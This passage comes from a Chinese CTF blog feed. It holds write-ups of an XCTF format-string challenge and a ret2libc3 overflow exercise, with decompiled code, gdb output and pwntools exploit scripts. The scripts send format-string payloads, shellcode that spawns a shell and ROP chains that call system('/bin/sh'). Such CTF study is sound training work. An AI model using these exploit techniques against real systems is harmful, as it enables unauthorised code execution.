class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You travel a short distance east.That's odd, anyone disappear suddenly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">", what happend?! You just travel , and find another hole"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You recall, a big black hole will suckk you into it! Know what should you do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"A voice heard in your mind"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your wish is"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 格式化字符串漏洞</span>                                                <span class="token comment" spellcheck="true">// </span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I hear it, I hear it...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">sub_400CA6</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span>函数：<span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400CA6</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Dragon say: HaHa! you were supposed to have a normal"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"RPG game, but I have changed it! you have no weapon and "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"skill! you could not defeat me !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"That's sound terrible! you meet final boss!but you level is ONE!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>                           <span class="token comment" spellcheck="true">// 第一个元素等于第二个元素，这两个元素地址是相邻的</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">4096uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 映射一个大小为4096字节的空间 该空间有读写执行权</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">256uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//这里比较难理解</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="3：解决疑难语句"><a href="#3：解决疑难语句" class="headerlink" title="3：解决疑难语句"></a>3：解决疑难语句</h2><p><strong>对于((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);这条语句我查了半天也没怎么理解，也就是说这个伪代码看不懂。在这种时候千万别忘了我们还可以看反汇编内容！！这一块区域的反汇编：</strong></p><pre class=" language-bash"><code class="language-bash">mov     edi, offset aWizardIWillHel <span class="token punctuation">;</span> <span class="token string">"Wizard: I will help you! USE YOU SPELL"</span>   call    putsmov     r9d, 0          <span class="token punctuation">;</span> offsetmov     r8d, 0FFFFFFFFh <span class="token punctuation">;</span> fdmov     ecx, 33         <span class="token punctuation">;</span> flagsmov     edx, 7          <span class="token punctuation">;</span> protmov     esi, 4096       <span class="token punctuation">;</span> lenmov     edi, 0          <span class="token punctuation">;</span> addrcall    mmapmov     <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>, raxmov     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     edx, 256        <span class="token punctuation">;</span> nbytesmov     rsi, rax        <span class="token punctuation">;</span> bufmov     edi, 0          <span class="token punctuation">;</span> fdcall    <span class="token function">read</span>mov     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     edi, 0call    rax</code></pre><p><strong>1-2：显然是对应：puts(“Wizard: I will help you! USE YOU SPELL”);这条语句，执行了这一条就能说明程序进入了if语句</strong><br><strong>3-9：是执行了mmap函数，先是将该函数的参数从右到左传入寄存器和一些特别的地方，最后进行调用mmap函数</strong><br><strong>10-15：主要是执行read函数，但我们可以发现这一段除了将传read函数的参数，还进行了其他操作。即第10第11条，将rax的值赋给[rbp+buf]代表的地址上面，又将[rbp+buf]代表的地址赋给rax。在传buf参数时，是将rax放入rsi，所以这个read函数将会入读数据到rax存放的地址上。结合IDA伪代码，这个地址就是可读可写可执行内存区，即[rbp+buf]所代表的地址。</strong><br><strong>16-18：将[rbp+buf]地址放入rax，17行应该不重要，18行就像调用函数一样直接调用rax。那么我们可以肯定((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1)可以执行程序读入的代码</strong></p><h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><p>1.main函数主要功能：开辟一个8字节的内存空间，该空间第一个元素大小赋值为68第二个元素大小赋值为85 ，输出两者的地址，然后进入sub_400D72(v4)函数<br>2.sub_400D72(v4)函数主要功能：输入一串字符作为角色名字，然后依次执行sub_400A7D()   sub_400BB9()  sub_400CA6((_DWORD *)a1)函数<br>3：sub_400A7D()函数主要功能：让用户输入test字符串，才能继续执行<br>4：sub_400BB9() 函数主要功能：输入1进入if语句，在该语句中先输入整数，再输入字符串，该字符串和后面的printf构成格式化字符串漏洞<br>5：sub_400CA6((_DWORD *)a1)函数主要功能：输出一堆废话 但是如果main函数中所开辟的空间中的第一个元素等于第二个元素，将映射一个有读写执行权的空间。然后在读取输入到空间中，最后那一串语句盲猜是要执行那段空间里面的数据</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>从main函数中得到两元素地址，在要执行sub_400BB9()函数时利用其包括的格式化字符串漏洞，改两个元素的值使其相等。这样在执行sub_400CA6((_DWORD *)a1)函数时就可以输入shellcode到一个映射空间，由下面的语句执行空间中的shellcode</strong></p><h2 id="4：exp"><a href="#4：exp" class="headerlink" title="4：exp"></a>4：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = process('./string')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span><span class="token number">32219</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'[0] is '</span><span class="token punctuation">)</span>addr1 <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>   <span class="token operator">//</span>获取地址sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'[1] is '</span><span class="token punctuation">)</span>addr2 <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token operator">//</span>获取地址<span class="token keyword">print</span> addr1<span class="token keyword">print</span> addr2<span class="token keyword">print</span> type<span class="token punctuation">(</span>addr1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'HUNTER'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'east'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#formal bug</span>payload3 <span class="token operator">=</span> <span class="token string">"AAA%082d"</span> <span class="token operator">+</span> <span class="token string">"%10$nAAA"</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#构造格式化字符串payload时要注意参数位置，以及对应程序操作位数</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#input shell</span><span class="token triple-quoted-string string">'''payload4 = ""payload4 += "\x01\x30\x8f\xe2"payload4 += "\x13\xff\x2f\xe1"payload4 += "\x78\x46\x0e\x30"payload4 += "\x01\x90\x49\x1a"payload4 += "\x92\x1a\x08\x27"payload4 += "\xc2\x51\x03\x37"payload4 += "\x01\xdf\x2f\x62"payload4 += "\x69\x6e\x2f\x2f"payload4 += "\x73\x68"'''</span>payload4 <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload4<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="5：知识点"><a href="#5：知识点" class="headerlink" title="5：知识点"></a>5：知识点</h2><p>mmap函数 </p><blockquote><p>mmap函数是unix/linux下的系统调用。<br>当存在客户－服务程序中复制文件时候，其数据流如下，要经历四次数据复制，开销很大。<br><img src="https://s1.ax1x.com/2020/07/04/NzLPjU.png" alt=""><br>如果采用共享内存的方式，那么将大大优化IO操作，数据流变成了如下，数据只复制两次：<br><img src="https://s1.ax1x.com/2020/07/04/NzLCcT.png" alt=""><br>映射文件或设备到内存中，取消映射就是munmap函数。<br>语法如下：</p></blockquote><blockquote><p>void mmap(void addr, size_t length, int prot, int flags, int fd, off_t offset);</p></blockquote><blockquote><p>int munmap(void *addr, size_t length);<br>该函数主要用途有三个：</p></blockquote><blockquote><p>1、将普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，用内存读写取代I/O读写，以获得较高的性能；</p></blockquote><blockquote><p>2、将特殊文件进行匿名内存映射，为关联进程提供共享内存空间；</p></blockquote><blockquote><p>3、为无关联的进程间的Posix共享内存（SystemV的共享内存操作是shmget/shmat）</p></blockquote><blockquote><p>我们来看下函数的入参选择：</p></blockquote><blockquote><p>1、参数addr：</p></blockquote><blockquote><p>指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p></blockquote><blockquote><p>2、参数length：</p></blockquote><blockquote><p>代表将文件中多大的部分映射到内存。</p></blockquote><blockquote><p>3、参数prot：</p></blockquote><blockquote><p>映射区域的保护方式。可以为以下几种方式的组合：</p></blockquote><blockquote><p>PROT_EXEC 映射区域可被执行</p></blockquote><blockquote><p>PROT_READ 映射区域可被读取</p></blockquote><blockquote><p>PROT_WRITE 映射区域可被写入</p></blockquote><blockquote><p>PROT_NONE 映射区域不能存取</p></blockquote><blockquote><p>4、参数flags：</p></blockquote><blockquote><p>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</p></blockquote><blockquote><p>MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此。</p></blockquote><blockquote><p>MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</p></blockquote><blockquote><p>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</p></blockquote><blockquote><p>MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</p></blockquote><blockquote><p>MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</p></blockquote><blockquote><p>MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</p></blockquote><blockquote><p>5、参数fd：</p></blockquote><blockquote><p>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。</p></blockquote><blockquote><p>6、参数offset：</p></blockquote><blockquote><p>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。如下图内存映射文件的示例。<br><img src="https://s1.ax1x.com/2020/07/04/NzLFuF.png" alt=""></p></blockquote><p>原文：<a href="https://segmentfault.com/a/1190000014616732" target="_blank" rel="noopener">https://segmentfault.com/a/1190000014616732</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki--ret2libc3</title>
      <link href="/2020/07/04/wiki-ret2libc3/"/>
      <url>/2020/07/04/wiki-ret2libc3/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/level3$ checksec ret2libc3<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/level3/ret2libc3'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>只有NX开启</p><h2 id="2：IDA-检查发现没有system和binsh字符串"><a href="#2：IDA-检查发现没有system和binsh字符串" class="headerlink" title="2：IDA 检查发现没有system和binsh字符串"></a>2：IDA 检查发现没有system和binsh字符串</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-64h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No surprise anymore, system disappeard QQ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>显然此处gets存在溢出</p><h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x0 EBX: 0x0 ECX: 0xf7fb25c0 --<span class="token operator">></span> 0xfbad2288 EDX: 0xf7fb389c --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x6941414d <span class="token punctuation">(</span><span class="token string">'MAAi'</span><span class="token punctuation">)</span>ESP: 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>EIP: 0x8048695 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804868a <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x8048440 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span>   0x804868f <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0   0x8048694 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x8048695 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret       0x8048696:    xchg   ax,ax   0x8048698:    xchg   ax,ax   0x804869a:    xchg   ax,ax   0x804869c:    xchg   ax,ax<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffd050 <span class="token punctuation">(</span><span class="token string">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffffd054 <span class="token punctuation">(</span><span class="token string">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffd058 <span class="token punctuation">(</span><span class="token string">"AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffd05c <span class="token punctuation">(</span><span class="token string">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffd060 <span class="token punctuation">(</span><span class="token string">"PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffd064 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffd068 <span class="token punctuation">(</span><span class="token string">"AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x08048695    30    <span class="token keyword">in</span> ret2libcGOT.cgdb-peda$ pattern offset AA8AANAAA8AANA found at offset: 112gdb-peda$ </code></pre><p>溢出点为112</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p><strong>存在栈溢出，可利用函数为puts  gets。我们构造一个puts函数让其输出puts函数的got表地址上的内容–即真正的地址，利用栈溢出控制程序转跳来实现。得到puts函数的确切地址后找到该函数在libc文件中的offset即求出libc地址，有了libc地址啥都好说。将上面构造的puts函数返回地址设置为main函数就可再次进行程序控制，不过这次控制它打开shell。</strong></p><p>exp：libc的地址也可以用__libc_start_main_got来获得</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"ret2libc3"</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#__libc_start_main_got = elf.got['__libc_start_main']</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload1 = "A"*112 + p32(puts_plt) + p32(main_addr) + p32(__libc_start_main_got)</span>payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"><a href="#在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化" class="headerlink" title="在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化"></a>在语法上是没有啥问题的，但是很可惜是错的。原因：第二次用gets进行溢出时溢出点发生了变化</h3><h2 id="4-探究"><a href="#4-探究" class="headerlink" title="4:探究"></a>4:探究</h2><p>我们来看看main函数的反汇编：</p><pre class=" language-bash"><code class="language-bash"> 08048618 <span class="token operator">&lt;</span>main<span class="token operator">></span>: 8048618:    55                       push   ebp     8048619:    89 e5                    mov    ebp,esp 804861b:    83 e4 f0                 and    esp,0xfffffff0 804861e:    83 c4 80                 add    esp,0xffffff80 8048621:    a1 60 a0 04 08           mov    eax,ds:0x804a060 8048626:    c7 44 24 0c 00 00 00     mov    DWORD PTR <span class="token 